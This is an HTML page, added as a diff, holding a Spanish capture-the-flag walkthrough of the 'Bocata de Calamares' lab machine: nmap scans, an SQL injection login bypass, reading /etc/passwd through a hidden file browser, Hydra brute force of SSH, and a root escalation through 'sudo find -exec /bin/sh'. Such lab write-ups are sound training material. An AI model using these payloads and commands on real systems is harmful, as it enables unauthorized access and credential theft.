@@ -1,0 +1,219 @@
+<div class="w-full md:w-2/3 mx-auto">
+    
+        <p class="my-4 text-xl">Escaneo de puertos</p>
+        <pre
+            class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    sudo nmap -T4 -F -sC -sV -Pn -n -oA calamares_nmap 192.168.72.131
+
+    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 19:33 EDT
+    Nmap scan report for 192.168.72.131
+    Host is up (0.00043s latency).
+    Not shown: 98 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   256 a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 (ECDSA)
+    |_  256 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 (ED25519)
+    80/tcp open  http    nginx 1.24.0 (Ubuntu)
+    |_http-title: AFN
+    |_http-server-header: nginx/1.24.0 (Ubuntu)
+    MAC Address: 00:0C:29:EE:56:AF (VMware)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
+  </pre>
+   
+
+    <p class="mb-2 mt-4 text-xl">Notas</p>
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">
+        El escaneo de puertos revela que el puerto 22 está abierto y ejecuta
+        OpenSSH, mientras que el puerto 80 está abierto y ejecuta Nginx. En
+        principio, no se encontraron vulnerabilidades conocidas en estos
+        servicios.
+    </p>
+    <p class="mb-2 mt-4 text-xl">Escaneo de vulnerabilidades</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    sudo nmap -T4 --script=vuln -p 22,80 192.168.72.131
+
+    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 08:29 EDT
+    Nmap scan report for 192.168.72.131
+    Host is up (0.00049s latency).
+
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+    | http-cookie-flags: 
+    |   /admin.php: 
+    |     PHPSESSID: 
+    |       httponly flag not set
+    |   /login.php: 
+    |     PHPSESSID: 
+    |_      httponly flag not set
+    |_http-dombased-xss: Couldn't find any DOM based XSS.
+    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+    |_http-csrf: Couldn't find any CSRF vulnerabilities.
+    | http-enum: 
+    |   /admin.php: Possible admin folder
+    |_  /login.php: Possible admin folder
+    MAC Address: 00:0C:29:EE:56:AF (VMware)
+
+    Nmap done: 1 IP address (1 host up) scanned in 74.18 seconds
+        </pre>
+    <p class="mb-2 mt-4 text-xl">Notas</p>
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">
+        En el escaneo de vulnerabilidades, se identificó que las cookies de sesión
+        no tienen la bandera httponly establecida. Además, se identificó la enumeración de directorios
+        o urls que podrían ser de administración, como /admin.php y /login.php.
+    </p>
+    <hr class="my-6 mx-6 border-neutral-800" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Cargamos la web en el navegador y navegamos a través de las
+        diferentes secciones.</p>
+    <img src="/img/calamares/calamares_1.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Encontramos la página sqli.php que nos habla de inyección
+        SQL. Seguramente, lo necesitamos para explotar la vulnerabilidad.</p>
+    <img src="/img/calamares/calamares_2.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Vamos a ver que encontramos en la página login.php</p>
+    <img src="/img/calamares/calamares_3.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Vemos que hay un formulario de login, vamos a probar a hacer
+        un ataque con sql injection. Probamos en el password con ' OR '1'='1</p>
+    <img src="/img/calamares/calamares_4.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Vemos que nos ha funcionado, ya podemos ver la página de
+        administración (admin.php).</p>
+    <img src="/img/calamares/calamares_5.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">En la página de administración, hay un enlace a la página
+        todo-list.php</p>
+    <img src="/img/calamares/calamares_6.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Dentro de las tareas, encontramos una que parece interesante
+        (marcada en rojo).<br />
+        El nombre de la página es <b>lee_archivos</b> encryptado en base64.
+    </p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    echo "lee_archivos" | base64
+
+    bGVlX2FyY2hpdm9zCg==    
+    </pre>
+    <p class="mb-4 text-neutral-200  text-sm md:text-base mt-4">Probamos el resultado como una URL
+        <b>/bGVlX2FyY2hpdm9zCg==.php</b>
+    </p>
+    <img src="/img/calamares/calamares_7.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Al acceder a la URL, encontramos con un buscador de archivos,
+        vamos a buscar el archivo de usuarios
+        <span class="text-green-500">/etc/passwd</span> y el fichero de contraseñas <span
+            class="text-green-500">/etc/shadow</span>.
+    </p>
+    <img src="/img/calamares/calamares_8.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base">Tenemos acceso al fichero de usuarios pero no aparece nada
+        sobre las contraseñas.
+        <br /> Filtramos los usuarios que tengan una shell <span class="text-green-500">/bin/bash</span>.
+    </p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    cat calamaresUser.txt | grep /bin/bash
+
+    root:x:0:0:root:/root:/bin/bash
+    tyuiop:x:1000:1000:tyuiop:/home/tyuiop:/bin/bash
+    superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
+    </pre>
+    <hr class="my-6 mx-6 border-neutral-800" />
+    <p class="mb-4 text-neutral-200  text-sm md:text-base mt-4">Con los usuario que hemos encontrado vamos a hacer un
+        ataque de fuerza bruta en el servicio de SSH</p>
+    <p class="mb-2 mt-4 text-xl">Hydra - Fuerza Bruta</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.72.131 -f -V -u
+
+    Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-05 19:57:41
+    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
+    [DATA] attacking ssh://192.168.72.131:22/
+
+    .......................
+
+    [RE-ATTEMPT] target 192.168.72.131 - login "superadministrator" - pass "princesa" - 217 of 15002 [child 8] 
+    [22][ssh] host: 192.168.72.131   login: superadministrator   password: princesa
+    [STATUS] attack finished for 192.168.72.131 (valid pair found)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-05 20:24:16
+    </pre>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">Hemos conseguido la contraseña del usuario
+        superadministrator: <b>princesa</b>.</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    ssh superadministrator@192.168.72.131
+    superadministrator@192.168.72.131's password: 
+
+    Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-52-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/pro
+
+    System information as of Fri Jun  6 05:20:55 PM UTC 2025
+
+    System load:  0.0                Processes:              239
+    Usage of /:   14.8% of 49.21GB   Users logged in:        0
+    Memory usage: 8%                 IPv4 address for ens33: 192.168.72.131
+    Swap usage:   0%
+
+
+    Expanded Security Maintenance for Applications is not enabled.
+
+    93 updates can be applied immediately.
+    To see these additional updates run: apt list --upgradable
+
+    Enable ESM Apps to receive additional future security updates.
+    See https://ubuntu.com/esm or run: sudo pro status
+
+
+    Last login: Fri Jun  6 00:13:18 2025 from 192.168.72.129
+    superadministrator@thehackerslabs-bocatacalamares:~$ 
+    </pre>
+    <p class="my-4 text-neutral-200 text-sm md:text-base">Hemos conseguido acceso al sistema.</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    superadministrator@thehackerslabs-bocatacalamares:~$ ls
+    flag.txt  recordatorio.txt
+    </pre>
+    <p class="my-4 text-center text-xl md:text-2xl"><span class="text-red-500">🚩 Bandera capturada</span></p>
+    <p class="my-4 text-neutral-200 text-sm md:text-base">Vemos el contenido del fichero recordatorio.txt<p>
+     "Me han dicho que existe una página llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante."
+    </p>
+    <p class="my-4 text-neutral-200 text-sm md:text-base">¿Qué es gtfobins? Es un proyecto muy conocido en el ámbito de la ciberseguridad ofensiva, 
+        especialmente en escaladas de privilegios y bypass de restricciones en sistemas Unix/Linux.</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    sudo -l
+
+    Matching Defaults entries for superadministrator on thehackerslabs-bocatacalamares:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+    User superadministrator may run the following commands on thehackerslabs-bocatacalamares:
+        (ALL) NOPASSWD: /usr/bin/find
+    </pre>
+    <p class="my-4 text-neutral-200 text-sm md:text-base">Vemos que el usuario superadministrator puede ejecutar el comando find sin contraseña. 
+        Así que buscaremos información en gtfobins sobre este comando.</p>
+    <img src="/img/calamares/calamares_9.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent"> 
+    sudo find / -exec /bin/sh -p \; -quit
+
+    # whoami
+    root
+    </pre>
+    <p class="my-4 text-neutral-200 text-sm md:text-base">Hemos conseguido escalar privilegios a root.</p>
+     <p class="my-4 text-center text-xl md:text-2xl"><span class="text-red-500">🚩 Bandera root capturada</span></p>
+</div>
